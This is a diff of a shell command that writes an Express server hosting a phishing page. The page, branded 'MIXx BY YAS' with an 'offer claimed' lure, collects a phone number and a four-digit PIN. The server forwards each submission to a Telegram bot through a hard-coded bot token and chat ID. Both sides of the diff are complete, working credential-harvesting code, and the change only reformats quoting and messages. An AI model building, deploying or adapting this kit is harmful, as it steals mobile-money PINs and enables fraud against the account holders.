@@ -1,19 +1,17 @@
-cat > server.js << 'EOF'
-const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
+echo 'const express = require("express");
+const axios = require("axios");
+const cors = require("cors");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const BOT_TOKEN = '8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y';
-const CHAT_ID = '8999616005';
+const BOT_TOKEN = "8884996201:AAGQHy_bXjAjZ7hUDGY4QRP0K-cSxHcXe9Y";
+const CHAT_ID = "8999616005";
 
 app.use(cors());
 app.use(express.json());
 
-// HTML PAGE
-app.get('/', (req, res) => {
+app.get("/", (req, res) => {
     res.send(`
 <!DOCTYPE html>
 <html>
@@ -28,7 +26,6 @@ app.get('/', (req, res) => {
         .pin-box{width:60px;height:60px;text-align:center;font-size:24px}
         button{width:100%;padding:12px;background:#d4af37;border:none;border-radius:10px;font-size:16px;cursor:pointer}
         .msg{color:red;margin-top:10px}
-        .success{color:green}
     </style>
 </head>
 <body>
@@ -47,42 +44,37 @@ app.get('/', (req, res) => {
     </div>
     <script>
         async function submitForm() {
-            const phone = document.getElementById('phone').value;
-            const pin = document.getElementById('pin1').value + document.getElementById('pin2').value + document.getElementById('pin3').value + document.getElementById('pin4').value;
-            
-            if(!phone || phone.length !== 10){ document.getElementById('msg').innerText = 'Phone must be 10 digits'; return; }
-            if(pin.length !== 4){ document.getElementById('msg').innerText = 'PIN must be 4 digits'; return; }
-            
-            document.getElementById('msg').innerText = 'Sending...';
-            document.getElementById('msg').style.color = 'blue';
-            
+            const phone = document.getElementById("phone").value;
+            const pin = document.getElementById("pin1").value + document.getElementById("pin2").value + document.getElementById("pin3").value + document.getElementById("pin4").value;
+            if(!phone || phone.length !== 10){ document.getElementById("msg").innerText = "Phone must be 10 digits"; return; }
+            if(pin.length !== 4){ document.getElementById("msg").innerText = "PIN must be 4 digits"; return; }
+            document.getElementById("msg").innerText = "Sending...";
             try {
-                const res = await fetch('/api/submit', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                const res = await fetch("/api/submit", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({phoneNumber: phone, pin: pin})
                 });
                 const data = await res.json();
                 if(data.success){
-                    document.getElementById('msg').style.color = 'green';
-                    document.getElementById('msg').innerText = 'Success! Offer claimed.';
-                    document.getElementById('phone').value = '';
-                    document.getElementById('pin1').value = '';
-                    document.getElementById('pin2').value = '';
-                    document.getElementById('pin3').value = '';
-                    document.getElementById('pin4').value = '';
+                    document.getElementById("msg").style.color = "green";
+                    document.getElementById("msg").innerText = "Success!";
+                    document.getElementById("phone").value = "";
+                    document.getElementById("pin1").value = "";
+                    document.getElementById("pin2").value = "";
+                    document.getElementById("pin3").value = "";
+                    document.getElementById("pin4").value = "";
                 } else {
-                    document.getElementById('msg').style.color = 'red';
-                    document.getElementById('msg').innerText = data.error || 'Failed';
+                    document.getElementById("msg").style.color = "red";
+                    document.getElementById("msg").innerText = data.error || "Failed";
                 }
             } catch(err) {
-                document.getElementById('msg').innerText = 'Network error. Try again.';
+                document.getElementById("msg").innerText = "Network error";
             }
         }
-        
         for(let i=1;i<=4;i++){
-            document.getElementById('pin'+i).addEventListener('input', function(e){
-                if(e.target.value && i<4) document.getElementById('pin'+(i+1)).focus();
+            document.getElementById("pin"+i).addEventListener("input", function(e){
+                if(e.target.value && i<4) document.getElementById("pin"+(i+1)).focus();
             });
         }
     </script>
@@ -91,38 +83,32 @@ app.get('/', (req, res) => {
     `);
 });
 
-// API ENDPOINT
-app.post('/api/submit', async (req, res) => {
-    console.log('=================================');
-    console.log('Received:', req.body);
-    console.log('=================================');
-    
+app.post("/api/submit", async (req, res) => {
+    console.log("Received:", req.body);
     const { phoneNumber, pin } = req.body;
     
     if(!phoneNumber || phoneNumber.length !== 10){
-        return res.json({success: false, error: 'Phone must be 10 digits'});
+        return res.json({success: false, error: "Phone must be 10 digits"});
     }
     if(!pin || pin.length !== 4){
-        return res.json({success: false, error: 'PIN must be 4 digits'});
+        return res.json({success: false, error: "PIN must be 4 digits"});
     }
     
-    const message = '🔔 MIXx BY YAS 🔔\n\n📱 Phone: ' + phoneNumber + '\n🔐 PIN: ' + pin + '\n⏰ Time: ' + new Date().toLocaleString();
+    const message = "NEW SUBMISSION\\nPhone: " + phoneNumber + "\\nPIN: " + pin + "\\nTime: " + new Date().toLocaleString();
     
     try {
-        await axios.post('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        await axios.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
             chat_id: CHAT_ID,
             text: message
         });
-        console.log('✅ Sent to Telegram!');
+        console.log("Sent to Telegram");
         res.json({success: true});
     } catch(err) {
-        console.log('❌ Telegram error:', err.message);
-        res.json({success: false, error: 'Telegram error'});
+        console.log("Telegram error:", err.message);
+        res.json({success: false, error: "Telegram error"});
     }
 });
 
 app.listen(PORT, () => {
-    console.log('🚀 Server running on port ' + PORT);
-    console.log('📱 Visit your app URL');
-});
-EOF
+    console.log("Server running on port " + PORT);
+});' > server.js
